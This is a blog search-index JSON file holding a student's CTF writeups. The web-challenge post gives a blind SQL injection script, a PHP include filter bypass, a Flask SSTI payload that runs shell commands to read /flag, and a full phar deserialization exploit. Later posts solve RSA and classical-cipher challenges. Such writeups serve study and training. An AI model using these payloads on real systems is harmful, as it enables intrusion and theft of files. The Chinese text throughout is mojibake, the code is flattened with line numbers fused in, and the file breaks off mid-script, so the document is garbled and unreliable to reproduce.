{"meta":{"title":"æ˜æœˆå½’çš„å°ç«™","subtitle":"å¾ˆèœçš„...","description":"è®°å½•ä¸€ç‚¹ä¸€æ»´","author":"æ˜æœˆå½’","url":"http://www.m00nback.xyz","root":"/"},"pages":[{"title":"404 Not Found","date":"2019-10-16T15:28:25.962Z","updated":"2019-10-16T15:15:06.059Z","comments":true,"path":"404.html","permalink":"http://www.m00nback.xyz/404.html","excerpt":"","text":"404 Not Found **å¾ˆæŠ±æ­‰ï¼Œæ‚¨è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨** å¯èƒ½æ˜¯è¾“å…¥åœ°å€æœ‰è¯¯æˆ–è¯¥åœ°å€å·²è¢«åˆ é™¤"},{"title":"å…³äº","date":"2020-04-28T07:27:00.479Z","updated":"2020-04-28T07:27:00.479Z","comments":true,"path":"about/index.html","permalink":"http://www.m00nback.xyz/about/index.html","excerpt":"","text":"å…³äºæœ¬äººä¸€åå–œæ¬¢ç½‘ç»œå®‰å…¨çš„å¤§å­¦ç”Ÿï¼Œç®€å•è®°å½•ä¸€ä¸‹å­¦ä¹ çš„è¿‡ç¨‹ï¼ï¼ï¼ å¦‚æœ‰ä»€ä¹ˆé—®é¢˜æ¬¢è¿è”ç³»æˆ‘QQ:3300162791 æ¯”èµ›ç»å† 2020/02/29 åˆå¤©å¾¡å®…æ¯å‰20(è®°ä¸æ¸…åæ¬¡äº†) 2020/01/16-2020/02/14 Hgame å‰100å(è®°ä¸æ¸…å…·ä½“åæ¬¡äº†) 2019/12/22 æ²³å—çœç¬¬ä¸€å±Šé‡‘ç›¾æ¯å›¢é˜Ÿ(å‡Œæ™¨ä¸‰ç‚¹åŠ)ç¬¬11å 2019/12/7 æ²³å—çœé«˜æ ¡ç½‘ç»œå®‰å…¨æŠ€èƒ½è”èµ›ä¸­åŸå·¥å­¦é™¢ç«™awdç¬¬1å"},{"title":"æˆ‘çš„æœ‹å‹ä»¬","date":"2020-09-17T10:25:28.706Z","updated":"2020-09-17T10:25:28.706Z","comments":true,"path":"friends/index.html","permalink":"http://www.m00nback.xyz/friends/index.html","excerpt":"","text":"å„ä½å¤§ä½¬æƒ³äº¤æ¢å‹é“¾çš„è¯å¯ä»¥åœ¨ä¸‹æ–¹ç•™è¨€ï¼Œå¿…é¡»è¦æœ‰åç§°ã€å¤´åƒé“¾æ¥ã€å’Œè‡³å°‘ä¸€ä¸ªæ ‡ç­¾å“¦ï½"},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2019-10-16T15:38:25.385Z","updated":"2019-10-16T15:38:13.106Z","comments":true,"path":"tags/index.html","permalink":"http://www.m00nback.xyz/tags/index.html","excerpt":"","text":""},{"title":"","date":"2019-10-16T15:31:34.917Z","updated":"2019-10-16T15:31:34.917Z","comments":true,"path":"projects/index.html","permalink":"http://www.m00nback.xyz/projects/index.html","excerpt":"","text":""},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2019-12-18T09:59:37.502Z","updated":"2019-12-18T09:59:37.502Z","comments":true,"path":"blog/categories/index.html","permalink":"http://www.m00nback.xyz/blog/categories/index.html","excerpt":"","text":""},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2019-10-16T15:38:25.385Z","updated":"2019-10-16T15:38:13.106Z","comments":true,"path":"blog/tags/index.html","permalink":"http://www.m00nback.xyz/blog/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"å·…å³°æå®¢2020 éƒ¨åˆ†é¢˜ç›®writeup","slug":"å·…å³°æå®¢2020-wp","date":"2020-09-26T08:25:39.000Z","updated":"2020-10-01T11:36:26.441Z","comments":true,"path":"2020/09/26/å·…å³°æå®¢2020-wp/","link":"","permalink":"http://www.m00nback.xyz/2020/09/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-wp/","excerpt":"å››é“é¢˜åšäº†ä¸‰é“è¿˜è¡Œï¼ğŸ¤­","text":"å››é“é¢˜åšäº†ä¸‰é“è¿˜è¡Œï¼ğŸ¤­ webbabybacksqlæ³¨å…¥ï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº† 1union and select &#39; &quot; - &#x3D; like &amp; mid è¿‡æ»¤å•åŒå¼•å·ï¼Œé©¬ä¸Šæƒ³åˆ°\\ï¼Œå‘ç°å¯ä»¥å¸ƒå°”ç›²æ³¨ï¼Œç›²çŒœå¯†ç å­—æ®µä¸ºpasswordï¼Œexp: 1234567891011121314151617181920212223242526272829import requestsurl=&quot;http://eci-2zedr7xc8tymr58mx2vp.cloudeci1.ichunqiu.com/index.php&quot;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;,&#x27;password&#x27;:&#x27;or if((ord(substr(password,&#123;&#125;,1))&gt;&#123;&#125;),1,0)#&#x27;.format(str(i),str(mid))&#125; data1=&#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;,&#x27;password&#x27;:&#x27;or if((ord(substr(password,&#123;&#125;,1)) in (&#123;&#125;)),1,0)#&#x27;.format(str(i),str(mid))&#125; try: r1=requests.post(url,data=data1) print(i,mid) if len(r1.text)!=2984: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if len(r.text)==2984: top=mid-1 if len(r.text)!=2984: low=mid+1 except Exception as e: pass if flag==f1: breakprint(flag) æ³¨å‡ºå¯†ç ä¸ºuAreRigHtï¼Œç™»é™†å‘ç°æ˜¯ä¸ªä»£ç æ‰§è¡Œ 1eval($command.&quot;=false&quot;); å¹¶ä¸”è¿‡æ»¤äº† 1ç©ºæ ¼ ^ &#39; &quot; ( å¯ä»¥ç›´æ¥åŒ…å«ï¼Œpayloadï¼Œå–åéƒ¨åˆ†ä¸º/flag: 1command&#x3D;include~%D0%99%93%9E%98?&gt; babyflaskç™»é™†çš„åœ°æ–¹åŒæˆ·åsstiï¼Œå‰ç«¯jséªŒè¯ ç›´æ¥pç¥çš„payloadå°±å¯ä»¥æ‰“ï¼š 1234567891011loged?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; babyphp2æ‰«ç›®å½•å‘ç°www.zip,classes.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158&lt;?phperror_reporting(0);session_start();class User&#123; public $id; public $age=null; public $nickname=null; public $backup; public function login() &#123; if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(); if($this-&gt;id)&#123; $_SESSION[&#x27;id&#x27;]=$this-&gt;id; $_SESSION[&#x27;login&#x27;]=1; echo &quot;ä½ çš„IDæ˜¯&quot;.$_SESSION[&#x27;id&#x27;]; echo &quot;ä½ å¥½ï¼&quot;.$_SESSION[&#x27;token&#x27;]; echo &quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;&lt;/script&gt;&quot;; &#125; &#125;&#125; public function upload()&#123; $uploader=new Upload(); $uploader-&gt;upload(); &#125; public function read()&#123; $reader=new reader(); $reader-&gt;read($_POST[&#x27;filename&#x27;]); &#125; public function __toString() &#123; $this-&gt;nickname-&gt;backup=$this-&gt;backup; $user = new User(); $user-&gt;id = $_SESSION[&#x27;id&#x27;]; $user-&gt;nickname = $_SESSION[&#x27;token&#x27;]; return serialize($user); &#125;&#125;class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;p3rh4ps&quot;; public $dbpass=&quot;p3rh4ps&quot;; public $database=&quot;p3rh4ps&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST[&#x27;username&#x27;]; $this-&gt;password=$_POST[&#x27;password&#x27;]; &#125; public function login() &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $sql=&quot;select id,password from users where username=?&quot;; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token==&#x27;admin&#x27;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo(&#x27;å¯†ç é”™è¯¯ï¼&#x27;); return false; &#125; $_SESSION[&#x27;token&#x27;]=$this-&gt;name; return $idResult; &#125; public function __destruct()&#123; echo $this-&gt;token; &#125;&#125;Class Upload&#123; public $flag; public $file; public $ext; function __construct()&#123; $this-&gt;flag = 1; $this-&gt;black_list = [&#x27;ph&#x27;, &#x27;ht&#x27;, &#x27;sh&#x27;, &#x27;pe&#x27;, &#x27;j&#x27;, &#x27;=&#x27;, &#x27;co&#x27;, &#x27;\\\\&#x27;, &#x27;&quot;&#x27;, &#x27;\\&#x27;&#x27;]; &#125; function check()&#123; $ext = substr($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], strpos($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], &#x27;.&#x27;)); $reg=implode(&quot;|&quot;,$this-&gt;black_list); $reg = &quot;/&quot; . $reg . &quot;\\x|\\s|[\\x01-\\x20]/i&quot;; if(preg_match($reg, $ext))&#123; $this-&gt;flag = 0; &#125; $this-&gt;ext = $ext; &#125; function __wakeup()&#123; $this-&gt;flag = 1; &#125; function upload()&#123; $this-&gt;file = $_FILES[&#x27;file&#x27;]; $this-&gt;check(); if($this-&gt;flag)&#123; if(isset($_FILES[&#x27;file&#x27;]))&#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;]; &#125; else&#123; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else&#123; if ($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 10240)&#123; echo &quot;too big&quot;; &#125; else&#123; $new_addr = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;] . &quot;/upload/&quot; . md5($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]) . $this-&gt;ext; echo $new_addr; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $new_addr); return $new_addr; &#125; &#125; &#125; &#125; &#125; else&#123; die(&quot;Noooooooooooooooooooooooooooo!&quot;); &#125; &#125;&#125;Class Reader&#123; public $filename; public $result; public function read($filename)&#123; if (preg_match(&quot;/flag/i&quot;,$filename))&#123; die(&quot;æƒ³å¤šäº†å—·&quot;); &#125; if (preg_match(&quot;/sh/i&quot;,$filename))&#123; die(&quot;nooooooooooo!&quot;); &#125; if (preg_match(&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;,$filename))&#123; die(&quot;Invid Schema!&quot;); &#125; echo file_get_contents($filename); &#125; public function __set($name,$val)&#123; echo file_get_contents($val);&#125;&#125; upload.php: 1234&lt;?php$user=new User();$user-&gt;upload();?&gt; read.php: 1234&lt;?php$user=new User();$user-&gt;read();?&gt; æ˜æ˜¾pharååºåˆ—åŒ–ï¼Œå…ˆçœ‹ä¸‹popé“¾ï¼š 1dbCtrl::__destruct() -&gt; User::__toString() -&gt; $this-&gt;nickname-&gt;backup&#x3D;$this-&gt;backup -&gt; __set($name,$val) å°±å¯ä»¥é€ æˆä»»æ„æ–‡ä»¶è¯»å– 123if (preg_match(&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;,$filename))&#123; die(&quot;Invid Schema!&quot;);&#125; é™åˆ¶äº†å‰ç¼€ï¼Œè¿™ä¸ªåœ°æ–¹å¯ä»¥å°†å…¶ä»–åè®®æµæ”¾åœ¨å‰é¢ç»•è¿‡ï¼Œæ³¨æ„pharæŒ‡å‘çš„æ–‡ä»¶ä¸èƒ½æ²¡åç¼€ 123compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gifcompress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gifphp:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;a.gif exp: 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;p3rh4ps&quot;; public $dbpass=&quot;p3rh4ps&quot;; public $database=&quot;p3rh4ps&quot;; public $name; public $password; public $mysqli; public $token; public function __construct()&#123; $this-&gt;token = new User(); &#125;&#125;class User&#123; public $id; public $age=null; public $nickname=null; public $backup; public function __construct()&#123; $this-&gt;nickname = new Reader; $this-&gt;backup = &#x27;/flag&#x27;; &#125;&#125;Class Reader&#123; public $filename; public $result;&#125;$phar = new Phar(&quot;aaa.phar&quot;); //åç¼€åå¿…é¡»ä¸º phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$object = new dbCtrl;$phar-&gt;setMetadata($object); //å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"}]},{"title":"buuctf cryptoéƒ¨åˆ†é¢˜ç›®writeup","slug":"buuctf-cryptoéƒ¨åˆ†é¢˜ç›®writeup","date":"2020-09-21T12:00:41.000Z","updated":"2020-09-24T13:31:09.064Z","comments":true,"path":"2020/09/21/buuctf-cryptoéƒ¨åˆ†é¢˜ç›®writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/","excerpt":"å­¦å­¦å¯†ç å­¦å§ï¼èœçš„é¡¶ä¸ä½äº†ğŸ˜­","text":"å­¦å­¦å¯†ç å­¦å§ï¼èœçš„é¡¶ä¸ä½äº†ğŸ˜­ å˜å¼‚å‡¯æ’’é¢˜ç›®ï¼š 12åŠ å¯†å¯†æ–‡ï¼šafZ_r9VYfScOeO_UL^RWUcæ ¼å¼ï¼šflag&#123; &#125; ç›´æ¥ç”¨å·¥å…·è§£å‘ç°æ²¡æœ‰åˆé€‚çš„ï¼Œçœ‹ä¸‹å‡¯æ’’å¯†ç çš„åŸç†å§ï¼š å‡¯æ’’åŠ å¯†æ³•ï¼Œæˆ–ç§°æºæ’’åŠ å¯†ã€æºæ’’å˜æ¢ã€å˜æ¢åŠ å¯†ï¼Œæ˜¯ä¸€ç§æœ€ç®€å•ä¸”æœ€å¹¿ä¸ºäººçŸ¥çš„åŠ å¯†æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§æ›¿æ¢åŠ å¯†çš„æŠ€æœ¯ï¼Œæ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚ æ‰€ä»¥ï¼Œå†™ä¸ªè„šæœ¬ï¼š 12345678s=&#x27;afZ_&#x27;s1=&#x27;flag&#x27;for i,j in zip(s1,s): print(ord(i)-ord(j))# 5# 6# 7# 8 ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸ªè§£å¯†flagçš„è„šæœ¬ï¼š 123456789s=&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;for i in range(-26,26): k=i flag=&#x27;&#x27; for j in s: flag+=chr(ord(j)+k) k+=1 if &#x27;flag&#x27; in flag: print(flag) ç¯±ç¬†å¢™çš„å½±å­æ …æ å¯†ç ï¼Œè§£å¯†è„šæœ¬ï¼š 12345678910111213def decrypto(plain): for n in range(2,len(plain)-1): ans = &#x27;&#x27; for i in range(n): for j in range(int(plain.__len__() / n + 0.5)): try: ans += plain[j * n + i] except: pass print(n,ans) s=&#x27;felhaagv&#123;ewtehtehfilnakgw&#125;&#x27;decrypto(s) RSAé¢˜ç›®ï¼š 12åœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p&#x3D;473398607161ï¼Œq&#x3D;4511491ï¼Œe&#x3D;17æ±‚è§£å‡ºdä½œä¸ºflgaæäº¤ exp: 1234567import gmpy2p=473398607161q=4511491e=17d=gmpy2.invert(e,(p-1)*(q-1))print(d) ä¸¢å¤±çš„MD5ä»¥ä¸ºå’Œdesæœ‰å…³ğŸ™ƒ 12345678910import hashlib for i in range(32,127): for j in range(32,127): for k in range(32,127): m=hashlib.md5() flag=&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27; m.update(flag.encode()) des=m.hexdigest() if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des: print(des) Aliceä¸Bobç›´æ¥ç”¨ç½‘ç«™åˆ†è§£ï¼šhttp://www.factordb.com å¾—åˆ°ï¼š 1101999 Â· 966233 rsarsaé¢˜ç›®ï¼š 123456789Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.p &#x3D; 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q &#x3D; 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e &#x3D; 65537c &#x3D; 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034Use RSA to find the secret message exp: 12345678910import gmpy2p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034d = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,p*q)print(m) å¤§å¸çš„å¯†ç æ­¦å™¨å¤§å¸å°±åº”è¯¥æƒ³åˆ°å‡¯æ’’å¤§å¸ï¼š å½“i=13æ—¶ å‘ç°è¾“å‡ºsecurity 123456789101112str1 = &#x27;FRPHEVGL&#x27;str2 = str1.lower() #è½¬æ¢ä¸ºå°å†™æ–¹ä¾¿è¯†åˆ«num = 1 #åç§»é‡for i in range(26): print(&quot;&#123;:&lt;2d&#125;&quot;.format(num),end = &#x27; &#x27;) for temp in str2: if(ord(temp)+num &gt; ord(&#x27;z&#x27;)): #å¦‚æœè¶…å‡º&#x27;z&#x27;,éœ€è¦é‡æ–°æ˜ å°„ä¼ša~zè¿™26ä¸ªå­—æ¯ä¸Š print(chr(ord(temp)+num-26),end = &#x27;&#x27;) else: print(chr(ord(temp)+num),end = &#x27;&#x27;) num += 1 print(&#x27;&#x27;) exp: 12345678str = &#x27;ComeChina&#x27;for temp in str: if(ord(temp)+13 &gt; ord(&#x27;z&#x27;)): print(chr(ord(temp)+13-26),end = &#x27;&#x27;) else: print(chr(ord(temp)+13),end = &#x27;&#x27;)print(&#x27;&#x27;)# PbzrPuvan ä¼ ç»ŸçŸ¥è¯†+å¤å…¸å¯†ç é¢˜ç›®ï¼š 12345å°æ˜æŸä¸€å¤©æ”¶åˆ°ä¸€å°å¯†ä¿¡ï¼Œä¿¡ä¸­å†™äº†å‡ ä¸ªä¸åŒçš„å¹´ä»½ è¾›å¯ï¼Œç™¸å·³ï¼Œä¸™æˆŒï¼Œè¾›æœªï¼Œåºšè¾°ï¼Œç™¸é…‰ï¼Œå·±å¯ï¼Œç™¸å·³ã€‚ ä¿¡çš„èƒŒé¢è¿˜å†™æœ‰â€œ+ç”²å­â€ï¼Œè¯·è§£å‡ºè¿™æ®µå¯†æ–‡ã€‚keyå€¼ï¼šCTF&#123;XXX&#125; å…­åç”²å­é¡ºåºè¡¨ å¯¹åº”çš„å¯†æ–‡æ˜¯ï¼š 128 30 23 8 17 10 16 30 åé¢æç¤º+ç”²å­ï¼ŒåŠ ä¸Š60å¾—åˆ°ï¼š 188 90 83 68 77 70 76 90 exp: 1234s=&#x27;88 90 83 68 77 70 76 90&#x27;for i in s.split(&#x27; &#x27;): print(chr(int(i)),end=&#x27;&#x27;)# XZSDMFLZ æ¥ç€æ …æ å¯†ç è§£å¯†ï¼š 123456789101112131415161718def decrypto(plain): for n in range(2,len(plain)-1): ans = &#x27;&#x27; for i in range(n): for j in range(int(plain.__len__() / n + 0.5)): try: ans += plain[j * n + i] except: pass print(n,ans) s=&#x27;XZSDMFLZ&#x27;decrypto(s)# 2 XSMLZDFZ# 3 XDLZMZSF# 4 XMZFSLDZ# 5 XFZLSZDM# 6 XZSDMF å¯¹ç¬¬å››æ å‡¯æ’’å¯†ç è§£å¯†å¾—åˆ°ç±»ä¼¼æ˜æ–‡ï¼Œæäº¤å³ä¸ºflagï¼š 1SHUANGYU ä¿¡æ¯åŒ–æ—¶ä»£çš„æ­¥ä¼é¢˜ç›®ï¼š 1606046152623600817831216121621196386 ä¸­æ–‡ç”µæŠ¥ç ï¼šhttp://code.mcdvisa.com flag: 1è®¡ç®—æœºè¦ä»å¨ƒå¨ƒæŠ“èµ· RSA1é¢˜ç›®ï¼š 12345p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 æ³„éœ²dpå’Œdqï¼Œexp: 12345678910111213141516171819202122232425262728import gmpy2def hex_to_ascii(h): h = h.replace(&#x27;0x&#x27;,&#x27;&#x27;) list_s = [] for i in range(0, len(h), 2): list_s.append(chr(int(h[i:i+2], 16))) return &#x27;&#x27;.join(list_s)def ascii_to_hex(s): list_h = [] for c in s: list_h.append(str(hex(ord(c))[2:])) return &#x27;&#x27;.join(list_h)def decrypt(dp,dq,p,q,c): InvQ = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m = (((mp-mq)*InvQ) % p)*q+mq print(hex_to_ascii(str(hex(m))))p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp,dq,p,q,c) å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ!é¢˜ç›®ï¼š 1MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; quipqiupè§£å¯†ï¼šhttps://quipqiup.com flag: 1flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125; old-fashionåŒæ ·æ˜¯quipqiupè§£å¯†ï¼šhttps://quipqiup.com èŒèŒå“’çš„å…«æˆ’çŒªåœˆå¯†ç åŠå…¶å˜ç§ï¼š æƒé™è·å¾—ç¬¬ä¸€æ­¥ntmlå“ˆå¸Œç›´æ¥è§£ RSA3é¢˜ç›®ï¼š 12345c1&#x3D;22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n&#x3D;22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1&#x3D;11187289c2&#x3D;18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2&#x3D;9647291 å…±æ¨¡æ”»å‡»,expï¼š 123456789101112131415161718import gmpy2import libnumdef common_modulus(n, e1, e2, c1, c2): assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) m = pow(c1, s1, n) if s1 &gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 &gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) m %= n return mc1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1=11187289c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2=9647291print(libnum.n2s(common_modulus(n, e1, e2, c1, c2))) ä¸–ä¸Šæ— éš¾äº‹åŒæ ·æ˜¯quipqiupè§£å¯†ï¼šhttps://quipqiup.com RSA2é¢˜ç›®: 12345e &#x3D; 65537n &#x3D; 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp &#x3D; 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c &#x3D; 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 æ³„éœ²dp exp: 1234567891011121314151617181920import gmpy2import libnumdef getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)//i)+1)==0: p=((dp*e-1)//i)+1 